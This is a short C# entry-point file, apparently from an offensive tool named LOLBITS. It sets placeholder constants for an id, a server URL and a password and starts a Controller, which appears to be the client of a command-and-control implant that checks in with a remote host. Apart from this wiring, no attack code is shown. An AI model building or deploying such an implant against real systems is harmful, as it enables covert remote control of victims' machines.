using LOLBITS.Controlling;

namespace LOLBITS
{
    public class Program
    {
        private const string FirstId = "<ident7>";
        private const string Url = "http://<ident6>/";
        private const string Password = "<ident3>";
        
        static void Main(string[] args)
        {
            var c = new Controller(FirstId, Url, Password);
            c.Start();
        }
    }
}
